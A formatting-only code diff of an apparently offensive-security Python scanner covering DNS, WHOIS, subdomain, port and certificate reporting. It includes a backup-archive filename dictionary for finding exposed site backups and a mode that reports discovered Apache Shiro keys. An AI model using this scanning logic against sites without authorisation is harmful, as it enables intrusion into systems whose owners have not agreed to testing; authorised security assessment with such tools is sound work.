-                        modules.append("DNS"+str(dns_model[i]))
-                        progress_num +=1
-
+                        modules.append("DNS" + str(dns_model[i]))
+                        progress_num += 1
 
             elif ch.startswith("WHOIS"):
                 whois_model = ch.split("\\")
-                for i in range(1,len(whois_model)):
+                for i in range(1, len(whois_model)):
                     if whois_model[i].isdigit():
-                        modules.append("WHOIS"+str(whois_model[i]))
-                        progress_num +=1
+                        modules.append("WHOIS" + str(whois_model[i]))
+                        progress_num += 1
 
             elif ch.startswith("SUBDOMAIN"):
-                progress_num +=1
+                progress_num += 1
                 modules.append("SUBDOMAIN")
 
-        if modules != []: break
+        if modules != []:
+            break
 
     progress = ProgressBar(progress_num, fmt=ProgressBar.FULL)
     infofuc = infoscan(domain)
@@ -8004,7 +8729,10 @@ def infoprocess(filename, domain):
             <ul class="nav nav-tabs"><li class="nav-item"><a class="nav-link active" href="#">Active</a></li><li class="nav-item"><a class="nav-link" href="#">Link</a></li><li class="nav-item"><a class="nav-link" href="#">Link</a></li><li class="nav-item"><a class="nav-link disabled" href="#">%s</a></li></ul><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA7CAMAAAAQJxn4AAAAAXNSR0IB2cksfwAAAAlwSFlzAAAuIwAALiMBeKU/dgAAAKVQTFRFCNbjAAAA////CNHd8/b3B8HM+Pz9B7G6CYeNBqWtEHyAB5Wd1tnY4+vs+Pz9+Pz9lKuqsLi3Snp5+Pv8+Pz9+Pz9NoKDdpiWxtbW+Pz9D2BjhNvhtcvLSmhm+Pz9V42OGsnVv/DzDHB0NVNR+Pz9O7zEm+vwVNzlbsjNN9vmdX18+Pz92tzd9fj5Xba72dvc4ePkbm9w5+nqx8nJAwMDxcfINjc3geQVTAAAADd0Uk5T/wD/////////////+v9L8P///wbWGv///5D/////a///////uf///////y47Iv8axQiAhgYQCe+hI20AAASCSURBVHicjVfpeqM4EFRAyFwCbMDhso2xnThx4jiZnXn/R9vWCeKY3fqTfIZSl6pbrQY9LeD795fA7++lV57Q3I9pftv/PB6PEPB4/PxEn+n/JefROSY4bNYJx7oJaXyO8hn+hJzvM0Lwsb4fDocNAP7cG0pIXE7Dj8gpo9L6rV25z6FE4q7a1yOjj6Mb5DQ6E/LyipDteP7aksB+4Njo7QWTbJ8ukvMyJkegAnkVHCjwCGc/uysbfmT0c75Azs8E14jDAdWM2HB24XsOYyMQn91mybeMHN8E13aCbcEE7woeehvw0IAjiaMZ8oALqt0DZoFPz5ycQGj56IWQaELOgYsUwK6Eb7baSd2BY/fs24gM++25YNc2BA7dVRXXjQ+u0o1Q3e9bkNNywEW25z5z1VXXCd2NskzEVp4L8p7Qt54LdjVcdRe4W7aKRbe9buZamfbkPMOvg8BgF0sy3rie5/NlCFSZo194o9JyTi7Jy4Cr7Aq7YAX5toxUi23jLFXkWzwQzVWHKkHwP9eNtwPLUHsU+WLkM6l7rq4uvIP37ZUfjlMNeMVZLsg5IUZguc+wChy2f74Fi/pDy8DxSJCNHWu7wGsm1PGEbvI81A2hzykjp9kwsK4urpqt5RczlrU0vjHyjdBhYGVXwVQDlG7cnw5uONkz8n6smlcXqPb4u8pvK3FNy6BQEHg9LBDVQqRqVqtSt2lZS8FvlMaG17KFCK+R0C3qhAxPB7KPsGmUEzxjF8urfFPrXhupriFZ6GacJ2UX3egwvW7Dsis4hiKjriHJRHoN5cXheNJvy0j1HY/I2i6SVG7grTi8wN9Qa9xQ0AWXI/IqEO/h96rzXQHf72QfNBrKhOyoiiDF2oA4HMbpGJNVx13EsKFw8sBtbdciBpbdmdufurR1C7HIFILcdPp0XFmeU0IGdvHN4c1uY2K3wep0SLLdQPtGT/pEqo7LWq6yWqKrGmWZbIRtkX0CuZRNSHdc671TOVYIlBmh0t3SMztVkXRMtxB8gj5rG3ACX9SJpVJ9F+dZHituF19+XRntyigAfneoLbMeJponrC7ssjbG6dFbkpZ1fOULzXgPA91YLC7sopXR6nQWi0GqbXamRN/OoJfojmsl3US16E7CsoJZ1hax7NvMslbbZe2mqoVu8ZjA3eFcMb/qGDk941rbRatgohrxFqNT7V1CfmGIiy6K6UWdiXXnTVUL3RQzwP2XwKHo7+cSN/IZ3U3tUpa9C5w2xWNwPz99PsLDaccxTbIOvTsJJOHHcDL48xGuNxUD3MkLZOhlfgeo3te//jEGmu+PsLh7gNUCl7Ghn3neNil+/RmNUt8/lF4dh9X0PBexEnecS0N/9PSuh7ivfUzrJaJe4FKQ8ms6AbKE9TPgPNo75mU5Q2YTJH1dDm5fGjycPEfzNpuZi6XgbUJHE/N40r/BtH68tnNRKcmiv036T2zYZ98JjcF3LtcCk3j/X98YnF5m7OumqOsroG4K+DzJynHUeTLbe1SeYQGBOMvK/W3utXkyi59H0Z5j6YsM8C8/RmMzzeRhegAAAABJRU5ErkJggg==" class="pull-right"></nav>
     <div class="container">
     <div style="height: 60px;margin-top: 20px"><h1 class="red-text text-center">%s</h1></div>
-    """%(domain,domain)
+    """ % (
+        domain,
+        domain,
+    )
     htmlWrite(htmlheaders, filename)
 
     # scan parameter
@@ -8013,24 +8741,27 @@ def infoprocess(filename, domain):
     DNS_content = []
     WHOIS_content = []
 
-
     # Do info scan
     for scanmod in modules:
-
 
         if scanmod == "SEGE":
             segementation = getattr(INFOHtml, scanmod)(infofuc)
             htmlWrite(segementation, filename)
 
         elif scanmod.startswith("DNS"):
-            if WHOIS_count&1 and WHOIS_count !=0:
+            if WHOIS_count & 1 and WHOIS_count != 0:
                 rows = """<div class="row">%s</div>
-                """%(WHOIS_content[0])
+                """ % (
+                    WHOIS_content[0]
+                )
                 htmlWrite(rows, filename)
                 WHOIS_content = []
 
             if DNS_count == 0:
-                htmlWrite('<div class="alert alert-warning text-center" role="alert" style="margin-top:20px">dns informations</div>', filename)
+                htmlWrite(
+                    '<div class="alert alert-warning text-center" role="alert" style="margin-top:20px">dns informations</div>',
+                    filename,
+                )
 
             ### row of dns records and vt_resolutions
 
@@ -8038,25 +8769,30 @@ def infoprocess(filename, domain):
             try:
                 DNS_content.append(getattr(INFOHtml, scanmod)(infofuc))
             except AttributeError:
-                DNS_count -=1
+                DNS_count -= 1
                 continue
-            if DNS_count&1 == 0 and DNS_count!=0:
+            if DNS_count & 1 == 0 and DNS_count != 0:
                 rows = """<div class="row">%s</div>
-                """%(DNS_content[0] + DNS_content[1])
+                """ % (
+                    DNS_content[0] + DNS_content[1]
+                )
                 htmlWrite(rows, filename)
                 DNS_content = []
 
-
-
         elif scanmod.startswith("WHOIS"):
-            if DNS_count&1 and DNS_count !=0:
+            if DNS_count & 1 and DNS_count != 0:
                 rows = """<div class="row">%s</div>
-                """%(DNS_content[0])
+                """ % (
+                    DNS_content[0]
+                )
                 htmlWrite(rows, filename)
                 DNS_content = []
 
             if WHOIS_count == 0:
-                htmlWrite("<div class=\"alert alert-warning text-center\" role=\"alert\" style=\"margin-top:20px\">whois informations</div>", filename)
+                htmlWrite(
+                    '<div class="alert alert-warning text-center" role="alert" style="margin-top:20px">whois informations</div>',
+                    filename,
+                )
 
             ### row of whois information
 
@@ -8064,35 +8800,41 @@ def infoprocess(filename, domain):
             if scanmod == "WHOIS1":
                 whois_information = getattr(INFOHtml, scanmod)(infofuc)
                 rows = """<div class="row">%s</div>
-                """%(whois_information)
+                """ % (
+                    whois_information
+                )
                 htmlWrite(rows, filename)
-                WHOIS_count +=2
+                WHOIS_count += 2
                 continue
-
 
             WHOIS_count += 1
             try:
                 WHOIS_content.append(getattr(INFOHtml, scanmod)(infofuc))
             except AttributeError:
-                WHOIS_count -=1
+                WHOIS_count -= 1
                 continue
-            if WHOIS_count&1 == 0 and WHOIS_count !=0:
+            if WHOIS_count & 1 == 0 and WHOIS_count != 0:
                 rows = """<div class="row">%s</div>
-                """%(WHOIS_content[0] + WHOIS_content[1])
+                """ % (
+                    WHOIS_content[0] + WHOIS_content[1]
+                )
                 htmlWrite(rows, filename)
                 WHOIS_content = []
-            
 
         elif scanmod == "SUBDOMAIN":
             ### subdomain area
-            htmlWrite("<div class=\"alert alert-warning text-center\" role=\"alert\" style=\"margin-top:20px\">subscan informations</div>", filename)            
+            htmlWrite(
+                '<div class="alert alert-warning text-center" role="alert" style="margin-top:20px">subscan informations</div>',
+                filename,
+            )
             subdomain_content = getattr(INFOHtml, scanmod)(infofuc)
 
             # row of subscan
             rows = """<div class="row">%s</div>
-            """%(subdomain_content)
+            """ % (
+                subdomain_content
+            )
             htmlWrite(rows, filename)
-
 
     # HTML footers
     footers = """
@@ -8108,28 +8850,28 @@ def infoprocess(filename, domain):
     htmlWrite(footers, filename)
 
 
-
-def htmlWrite(content,filename):
-    html = open(filename,"a")
+def htmlWrite(content, filename):
+    html = open(filename, "a")
     html.write(content)
     html.close()
 
 
 def mkdir(path):
- 
+
     folder = os.path.exists(path)
- 
+
     if not folder:
         os.makedirs(path)
         print("---  new folder...  ---")
         print("---  OK  ---")
- 
+
     else:
         print("---  There is this folder!  ---")
 
 
 class DatamineThread(threading.Thread):
     """Threaded Url Grab"""
+
     def __init__(self, out_queue, method, lock, outfile, watches):
         threading.Thread.__init__(self)
         self.out_queue = out_queue
@@ -8148,40 +8890,74 @@ class DatamineThread(threading.Thread):
                 open_ports = args[1]
                 """
                 port_list = args[0]
-
                 open_ports = args[1]
+
                 ip = args[2]
-                certs , origin = None, None
+                certs, origin = None, None
                 self.lock.acquire(1)
                 for n in port_list:
                     if open_ports[n] == "open":
                         if n == "443":
-                            certs , origin = getHttpCert(ip, 443)
-                            print("[ %s     open     %s     %d/tcp CertDomain:%s %s]" % (service(int(n)), ip, int(n), certs, origin) + " "*30 + "\n")
-                            wpinfo = "[" + service(int(n)) + " | open | " + ip + "  |  " + str(n) + " | " + certs + " | " + origin + "]\n"
+                            certs, origin = getHttpCert(ip, 443)
+                            print(
+                                "[ %s     open     %s     %d/tcp CertDomain:%s %s]"
+                                % (service(int(n)), ip, int(n), certs, origin)
+                                + " " * 30
+                                + "\n"
+                            )
+                            wpinfo = (
+                                "["
+                                + service(int(n))
+                                + " | open | "
+                                + ip
+                                + "  |  "
+                                + str(n)
+                                + " | "
+                                + certs
+                                + " | "
+                                + origin
+                                + "]\n"
+                            )
                         else:
-                            print("[ %s     open     %s     %d/tcp ]" % (service(int(n)), ip,int(n)) + " "*40 + "\n")
-                            wpinfo = "[" + service(int(n)) + " | open | " + ip + "  |  " + str(n)+ "]\n"
+                            print(
+                                "[ %s     open     %s     %d/tcp ]"
+                                % (service(int(n)), ip, int(n))
+                                + " " * 40
+                                + "\n"
+                            )
+                            wpinfo = (
+                                "["
+                                + service(int(n))
+                                + " | open | "
+                                + ip
+                                + "  |  "
+                                + str(n)
+                                + "]\n"
+                            )
                         if JSONFILE:
-                            wpinfo = ("{\"%s\":{"
-                                    "\"certs_origin\": \"%s\","
-                                    "\"certs\": \"%s\","
-                                    "\"port\": \"%s\","
-                                    "\"host\": \"%s\","
-                                    "\"type\": \"%s\"}}" % (
-                                        args[2], origin,
-                                        certs, n,
-                                        args[2], service(int(n))
-                                    ))
+                            wpinfo = (
+                                '{"%s":{'
+                                '"certs_origin": "%s",'
+                                '"certs": "%s",'
+                                '"port": "%s",'
+                                '"host": "%s",'
+                                '"type": "%s"}}'
+                                % (args[2], origin, certs, n, args[2], service(int(n)))
+                            )
                         resAlivedomainFile.write(wpinfo.encode())
 
                 resAlivedomainFile.flush()
                 self.lock.release()
 
-            elif (self.method == "tscan" or self.method == "subscan"
-                or self.method == "bakscan" or self.method == "sscan"
-                or self.method == "fscan" or self.method == "sfscan"
-                or self.method == "hostscan"):
+            elif (
+                self.method == "tscan"
+                or self.method == "subscan"
+                or self.method == "bakscan"
+                or self.method == "sscan"
+                or self.method == "fscan"
+                or self.method == "sfscan"
+                or self.method == "hostscan"
+            ):
 
                 """
                 args[0]  Response
@@ -8202,10 +8978,10 @@ class DatamineThread(threading.Thread):
                 origin = "null"
 
                 # parse the chunk
-                
+
                 p = re.compile("<title[\s\S]*?>([\s\S]*?)</title>", re.IGNORECASE)
                 try:
-                    #print response
+                    # print response
                     target = re.findall(p, response)
                     if len(target) == 0:
                         target.append("None")
@@ -8217,7 +8993,7 @@ class DatamineThread(threading.Thread):
                     response = target[0]
 
                 if len(serverinfo) > 500:
-                    serverinfo = serverinfo[: 500] + attention(" [has more content ...]")
+                    serverinfo = serverinfo[:500] + attention(" [has more content ...]")
 
                 self.lock.acquire(1)
 
@@ -8225,80 +9001,251 @@ class DatamineThread(threading.Thread):
                 if PYVERSION > "3.0":
                     response = response.encode()
 
-                # to get certification of url 
+                # to get certification of url
 
                 # print log to console
                 try:
                     if "https" in domain:
                         try:
-                            httpsDomain = domain.replace("https://","").split("/")
+                            httpsDomain = domain.replace("https://", "").split("/")
                             httpsDomain = httpsDomain[0]
 
                             if ":" in httpsDomain:
-                                cert_namespace_ip, cert_namespace_port = httpsDomain.split(":")
+                                (
+                                    cert_namespace_ip,
+                                    cert_namespace_port,
+                                ) = httpsDomain.split(":")
                             else:
-                                cert_namespace_ip, cert_namespace_port = httpsDomain, "443"
+                                cert_namespace_ip, cert_namespace_port = (
+                                    httpsDomain,
+                                    "443",
+                                )
 
-                            certs, origin = getHttpCert(cert_namespace_ip, cert_namespace_port)
+                            certs, origin = getHttpCert(
+                                cert_namespace_ip, cert_namespace_port
+                            )
                             del cert_namespace_ip, cert_namespace_port
                         except Exception as e:
                             certs = "null"
                             origin = "null"
-                        print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:"+ str(lenres) + " | " + eagle(response.decode()) + " | " + "Certs URL: " + certs + " | " + origin + info(" ]") )
+                        print(
+                            info("[")
+                            + PASSAT(str(domain))
+                            + " | "
+                            + serverinfo
+                            + " | "
+                            + Huskie(str(response_code))
+                            + " | Size:"
+                            + str(lenres)
+                            + " | "
+                            + eagle(response.decode())
+                            + " | "
+                            + "Certs URL: "
+                            + certs
+                            + " | "
+                            + origin
+                            + info(" ]")
+                        )
                     else:
-                        print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:"+ str(lenres) + " | " + eagle(response.decode()) + info(" ]") + " "*11)
+                        print(
+                            info("[")
+                            + PASSAT(str(domain))
+                            + " | "
+                            + serverinfo
+                            + " | "
+                            + Huskie(str(response_code))
+                            + " | Size:"
+                            + str(lenres)
+                            + " | "
+                            + eagle(response.decode())
+                            + info(" ]")
+                            + " " * 11
+                        )
                 except Exception as e:
                     try:
                         if "https" in domain:
                             try:
-                                httpsDomain = domain.replace("https://","").split("/")
+                                httpsDomain = domain.replace("https://", "").split("/")
                                 httpsDomain = httpsDomain[0]
                                 # print "domain is : ",httpsDomain
                                 if ":" in httpsDomain:
-                                    cert_namespace_ip, cert_namespace_port = httpsDomain.split(":")
+                                    (
+                                        cert_namespace_ip,
+                                        cert_namespace_port,
+                                    ) = httpsDomain.split(":")
                                 else:
-                                    cert_namespace_ip, cert_namespace_port = httpsDomain, "443"
-                                certs, origin = getHttpCert(cert_namespace_ip, cert_namespace_port)
+                                    cert_namespace_ip, cert_namespace_port = (
+                                        httpsDomain,
+                                        "443",
+                                    )
+                                certs, origin = getHttpCert(
+                                    cert_namespace_ip, cert_namespace_port
+                                )
                                 del cert_namespace_ip, cert_namespace_port
                             except Exception as e:
                                 certs = "null"
                                 origin = "null"
-                            print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:"+ str(lenres) + " | " + eagle(response.decode()) + " | " + "Certs URL: "+certs + " | " + origin + info(" ]") )
+                            print(
+                                info("[")
+                                + PASSAT(str(domain))
+                                + " | "
+                                + serverinfo
+                                + " | "
+                                + Huskie(str(response_code))
+                                + " | Size:"
+                                + str(lenres)
+                                + " | "
+                                + eagle(response.decode())
+                                + " | "
+                                + "Certs URL: "
+                                + certs
+                                + " | "
+                                + origin
+                                + info(" ]")
+                            )
                         else:
-                            print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:"+ str(lenres) + " | " + eagle(response.encode("utf-8")) + info(" ]") +" "*11)
+                            print(
+                                info("[")
+                                + PASSAT(str(domain))
+                                + " | "
+                                + serverinfo
+                                + " | "
+                                + Huskie(str(response_code))
+                                + " | Size:"
+                                + str(lenres)
+                                + " | "
+                                + eagle(response.encode("utf-8"))
+                                + info(" ]")
+                                + " " * 11
+                            )
                     except Exception as e:
                         try:
                             if "https" in domain:
                                 try:
-                                    httpsDomain = domain.replace("https://","").split("/")
+                                    httpsDomain = domain.replace("https://", "").split(
+                                        "/"
+                                    )
                                     httpsDomain = httpsDomain[0]
                                     if ":" in httpsDomain:
-                                        cert_namespace_ip, cert_namespace_port = httpsDomain.split(":")
+                                        (
+                                            cert_namespace_ip,
+                                            cert_namespace_port,
+                                        ) = httpsDomain.split(":")
                                     else:
-                                        cert_namespace_ip, cert_namespace_port = httpsDomain, "443"
-                                    certs, origin = getHttpCert(cert_namespace_ip, cert_namespace_port)
+                                        cert_namespace_ip, cert_namespace_port = (
+                                            httpsDomain,
+                                            "443",
+                                        )
+                                    certs, origin = getHttpCert(
+                                        cert_namespace_ip, cert_namespace_port
+                                    )
                                     del cert_namespace_ip, cert_namespace_port
                                 except Exception as e:
                                     certs = "null"
                                     origin = "null"
-                                print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:"+ str(lenres) + " | " + eagle(response) + " | " + "Certs URL: " + certs + " | " + origin + info(" ]") )
+                                print(
+                                    info("[")
+                                    + PASSAT(str(domain))
+                                    + " | "
+                                    + serverinfo
+                                    + " | "
+                                    + Huskie(str(response_code))
+                                    + " | Size:"
+                                    + str(lenres)
+                                    + " | "
+                                    + eagle(response)
+                                    + " | "
+                                    + "Certs URL: "
+                                    + certs
+                                    + " | "
+                                    + origin
+                                    + info(" ]")
+                                )
                             else:
-                                print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:"+ str(lenres) + " | " + eagle(response) + info(" ]")  + " "*11)
+                                print(
+                                    info("[")
+                                    + PASSAT(str(domain))
+                                    + " | "
+                                    + serverinfo
+                                    + " | "
+                                    + Huskie(str(response_code))
+                                    + " | Size:"
+                                    + str(lenres)
+                                    + " | "
+                                    + eagle(response)
+                                    + info(" ]")
+                                    + " " * 11
+                                )
                         except Exception as e:
                             # traceback.print_exc()
 
                             if PYVERSION > "3.0":
                                 try:
-                                    print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:" + str(lenres) + " | " + eagle(response) + info(" ]") + " " * 11)
+                                    print(
+                                        info("[")
+                                        + PASSAT(str(domain))
+                                        + " | "
+                                        + serverinfo
+                                        + " | "
+                                        + Huskie(str(response_code))
+                                        + " | Size:"
+                                        + str(lenres)
+                                        + " | "
+                                        + eagle(response)
+                                        + info(" ]")
+                                        + " " * 11
+                                    )
                                 except Exception as e:
-                                    print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:" + str(lenres) + " | " + "Download site" + info(" ]") + " " * 11)
+                                    print(
+                                        info("[")
+                                        + PASSAT(str(domain))
+                                        + " | "
+                                        + serverinfo
+                                        + " | "
+                                        + Huskie(str(response_code))
+                                        + " | Size:"
+                                        + str(lenres)
+                                        + " | "
+                                        + "Download site"
+                                        + info(" ]")
+                                        + " " * 11
+                                    )
                             else:
                                 try:
-                                    print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:" + str(lenres) + " | " + eagle(response.encode()) + info(" ]") + " " * 11)
+                                    print(
+                                        info("[")
+                                        + PASSAT(str(domain))
+                                        + " | "
+                                        + serverinfo
+                                        + " | "
+                                        + Huskie(str(response_code))
+                                        + " | Size:"
+                                        + str(lenres)
+                                        + " | "
+                                        + eagle(response.encode())
+                                        + info(" ]")
+                                        + " " * 11
+                                    )
                                 except Exception as e:
-                                    print(info("[") + PASSAT(str(domain)) + " | " + serverinfo + " | " + Huskie(str(response_code)) + " | Size:" + str(lenres) + " | " + "Download site" + info(" ]") + " " * 11)
-                            print(bingo(domain) + "-------------Print error!  But don't  worry !")
-                    
+                                    print(
+                                        info("[")
+                                        + PASSAT(str(domain))
+                                        + " | "
+                                        + serverinfo
+                                        + " | "
+                                        + Huskie(str(response_code))
+                                        + " | Size:"
+                                        + str(lenres)
+                                        + " | "
+                                        + "Download site"
+                                        + info(" ]")
+                                        + " " * 11
+                                    )
+                            print(
+                                bingo(domain)
+                                + "-------------Print error!  But don't  worry !"
+                            )
+
                 # .encode("utf-8").decode(sys.stdin.encoding)
                 self.lock.release()
 
@@ -8309,9 +9256,33 @@ class DatamineThread(threading.Thread):
 
                     resAlivedomainFile.write(b"\n")
                     if "https" in domain:
-                        wpinfo = "[ " + domain + " | " + response + "  |  " + str(response_code) + "   |   " + serverinfo + " | " + certs + " | " + origin  + " ]\n"
+                        wpinfo = (
+                            "[ "
+                            + domain
+                            + " | "
+                            + response
+                            + "  |  "
+                            + str(response_code)
+                            + "   |   "
+                            + serverinfo
+                            + " | "
+                            + certs
+                            + " | "
+                            + origin
+                            + " ]\n"
+                        )
                     else:
-                        wpinfo = "[ " + domain + " | " + response + "  |  " + str(response_code) + "   |   " + serverinfo + " ]\n"
+                        wpinfo = (
+                            "[ "
+                            + domain
+                            + " | "
+                            + response
+                            + "  |  "
+                            + str(response_code)
+                            + "   |   "
+                            + serverinfo
+                            + " ]\n"
+                        )
 
                     if JSONFILE:
                         domain_lists = domain.split("|")
@@ -8321,7 +9292,14 @@ class DatamineThread(threading.Thread):
                         for server in domain_lists[1:]:
                             if PYVERSION > "3.0":
                                 server = server.encode()
-                            servers += fparse(server).decode().replace("[", "").replace("]","").strip() + ","
+                            servers += (
+                                fparse(server)
+                                .decode()
+                                .replace("[", "")
+                                .replace("]", "")
+                                .strip()
+                                + ","
+                            )
                         servers += serverinfo
                         if "---->" in real_domain:
                             real_domain, redirect_url = real_domain.split("---->")
@@ -8329,21 +9307,32 @@ class DatamineThread(threading.Thread):
                             redirect_url = redirect_url.strip()
                         else:
                             redirect_url = ""
-                        response = response.replace("\\","").replace("\n","").replace("\"","\\\"")
+                        response = (
+                            response.replace("\\", "")
+                            .replace("\n", "")
+                            .replace('"', '\\"')
+                        )
 
-                        wpinfo = ("{\"%s\":{"
-                                "\"certs_origin\": \"%s\","
-                                "\"certs\": \"%s\","
-                                "\"response_code\": \"%d\","
-                                "\"serverinfo\": \"%s\","
-                                "\"host\": \"%s\","
-                                "\"redirect_url\": \"%s\","
-                                "\"type\": \"%s\"}}" % (
-                                    real_domain, origin,
-                                    certs, response_code,
-                                    response,real_domain,
-                                    redirect_url, servers
-                            ))
+                        wpinfo = (
+                            '{"%s":{'
+                            '"certs_origin": "%s",'
+                            '"certs": "%s",'
+                            '"response_code": "%d",'
+                            '"serverinfo": "%s",'
+                            '"host": "%s",'
+                            '"redirect_url": "%s",'
+                            '"type": "%s"}}'
+                            % (
+                                real_domain,
+                                origin,
+                                certs,
+                                response_code,
+                                response,
+                                real_domain,
+                                redirect_url,
+                                servers,
+                            )
+                        )
 
                     resAlivedomainFile.write(fparse(wpinfo.encode()))
 
@@ -8369,9 +9358,9 @@ class DatamineThread(threading.Thread):
             elif self.method == "cdnscan":
 
                 """
-                    args[0]: Type of CDN
-                    args[1][0]: Domain
-                    args[1][1]: Origin request host
+                args[0]: Type of CDN
+                args[1][0]: Domain
+                args[1][1]: Origin request host
                 """
                 type_cdn = args[0]
                 domain = args[1][0]
@@ -8380,7 +9369,10 @@ class DatamineThread(threading.Thread):
                 if type_cdn is not None:
                     self.lock.acquire(1)
 
-                    wpinfo = "%s %-20s %s                                            \n" %(info(type_cdn), origin_request_host, domain)
+                    wpinfo = (
+                        "%s %-20s %s                                            \n"
+                        % (info(type_cdn), origin_request_host, domain)
+                    )
                     print(wpinfo)
 
                     try:
@@ -8392,18 +9384,24 @@ class DatamineThread(threading.Thread):
                     self.lock.release()
 
             elif self.method == "shscan":
-                # shiro 扫描的结果
                 """
-                    args[0]: Shiro Key
-                    args[1][0]: Domain
-                    args[1][1]: Origin request host                    
+                args[0]: Shiro Key
+                args[1][0]: Domain
+                args[1][1]: Origin request host
                 """
                 shiro_key = args[0]
                 domain = args[1][0]
                 origin_request_host = args[1][1]
                 if shiro_key is not None:
                     self.lock.acquire(1)
-                    wpinfo = info("[") + PASSAT(str(domain)) + " | " +  Huskie(shiro_key) + info(" ]") + " " * 20
+                    wpinfo = (
+                        info("[")
+                        + PASSAT(str(domain))
+                        + " | "
+                        + Huskie(shiro_key)
+                        + info(" ]")
+                        + " " * 20
+                    )
                     print(wpinfo)
 
                     try:
@@ -8417,13 +9415,14 @@ class DatamineThread(threading.Thread):
             # signals to queue job is done
             self.out_queue.task_done()
 
+
 class Watcher:
     def __init__(self, windows=None):
-        """ 
-            Creates a child thread, which returns.  The parent
-            thread waits for a KeyboardInterrupt and then kills 
-            the child thread. 
-        """  
+        """
+        Creates a child thread, which returns.  The parent
+        thread waits for a KeyboardInterrupt and then kills
+        the child thread.
+        """
 
         if platform.system() == "Windows":
             try:
@@ -8446,7 +9445,7 @@ class Watcher:
                 return
             else:
                 self.watch()
-    
+
     def watch(self, signal=None):
         try:
             if signal:
@@ -8467,7 +9466,7 @@ class Watcher:
                     RESULTFILE.close()
                     FOCUSFILE.close()
             except:
-                pass 
+                pass
             self.kill()
             print(eagle("\n\nTask Interrupt"))
             os._exit(0)
@@ -8484,22 +9483,22 @@ class Watcher:
 
         # for *inux kill parent process
         sys.exit()
-    
-    def kill(self):  
+
+    def kill(self):
         try:
             if platform.system() == "Windows":
                 self.event.set()
                 self.event.clear()
-            else:  
+            else:
                 os.kill(self.child, signal.SIGKILL)
 
             gc.collect()
-        except OSError: 
+        except OSError:
             gc.collect()
 
 
 def bak_make_domaindic(url):
-    #method 1
+    # method 1
     if url.startswith("http://"):
         ucp = url.lstrip("http://")
     elif url.startswith("https://"):
@@ -8520,14 +9519,20 @@ def bak_make_domaindic(url):
         wwwhost += www1[i]
         wwwhosttitle += www1[i].title()
         wwwhostuppper += www1[i].upper()
-    domainDic = [ucp, ucp.replace(".", ""), wwwhost, wwwhosttitle, wwwhostuppper, ucp.split(".", 1)[-1]]
+    domainDic = [
+        ucp,
+        ucp.replace(".", ""),
+        wwwhost,
+        wwwhosttitle,
+        wwwhostuppper,
+        ucp.split(".", 1)[-1],
+    ]
     for i in range(wwwlen - 1):
         domainDic.append(www1[i])
         domainDic.append(www1[i].title())
         domainDic.append(www1[i].upper())
 
-
-    #method 2
+    # method 2
     method_2_temp = url.lstrip("http://").lstrip("https://").split("/")
     domainDic += method_2_temp
 
@@ -8537,9 +9542,29 @@ def bak_make_domaindic(url):
 
 
 def bak_join(url, domainDic):
-    bak_suffix = [".rar", ".zip", ".gz", ".sql.gz", ".tar.gz", ".sql", ".tar.tgz", ".tar", ".war"]
-    bak_default_dic = ["__zep__/js.zip", "faisunzip.zip", "wwwroot.zip", "wwwroot.rar", "wwwroot.tar.gz", "wwwroot.gz",
-                       "wwwroot.sql.zip", "wwwroot.sql", "backup.zip", "bbs.zip"]
+    bak_suffix = [
+        ".rar",
+        ".zip",
+        ".gz",
+        ".sql.gz",
+        ".tar.gz",
+        ".sql",
+        ".tar.tgz",
+        ".tar",
+        ".war",
+    ]
+    bak_default_dic = [
+        "__zep__/js.zip",
+        "faisunzip.zip",
+        "wwwroot.zip",
+        "wwwroot.rar",
+        "wwwroot.tar.gz",
+        "wwwroot.gz",
+        "wwwroot.sql.zip",
+        "wwwroot.sql",
+        "backup.zip",
+        "bbs.zip",
+    ]
 
     # init
     for bak_s in bak_default_dic:
@@ -8549,8 +9574,8 @@ def bak_join(url, domainDic):
             yield url + "/" + bak_d + bak_s
 
 
-
 this_module = sys.modules["__main__"]
+
 
 def bakscan_core(bak_temp_url):
     global progress_num
@@ -8559,10 +9584,12 @@ def bakscan_core(bak_temp_url):
         progress_num += 1
         queue.put(bak_url)
 
+
 def tscan_core(current_url):
     global progress_num
     progress_num += 1
     queue.put(current_url)
+
 
 def subscan_core(url):
     global progress_num
@@ -8570,8 +9597,10 @@ def subscan_core(url):
     queue.put(url)
 
 
+def Encapsulation_before_tscan(
+    mf, hr, task_list, method, listport, threadnum, outfile, urlpath
+):
 
-def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, outfile, urlpath):
     if urlpath == None:
         # urlpath == None without urlpath info
         if listport[0] == "":
@@ -8599,11 +9628,10 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                             bak_temp_url = "https://" + url
                             getattr(this_module, mf)(bak_temp_url)
             except IndexError:
-                print(bingo("-")+" No result!")
+                print(bingo("-") + " No result!")
                 sys.exit()
             except Exception as e:
                 print(e)
-
 
         else:
             # normal mode
@@ -8631,7 +9659,6 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                         # host, port = url.split(":")[0], url.split(":")[1]
                         # queue.put("http://" + host + ":" + str(i))
 
-
                         bak_temp_url = "http://" + url + ":" + str(i)
                         getattr(this_module, mf)(bak_temp_url)
 
@@ -8651,7 +9678,6 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
 
                             bak_temp_url = "https://" + url + ":" + str(i)
 
-
                             getattr(this_module, mf)(bak_temp_url)
                     elif "//" not in url and ":" not in url and "/" in url:
                         # www.example.com/login
@@ -8665,15 +9691,31 @@ def Encapsulation_before_tscan(mf, hr, task_list, method, listport, threadnum, o
                                 urlpath += "/" + o
                         else:
                             host, urlpath = url.split("/")[0], url.split("/")[1]
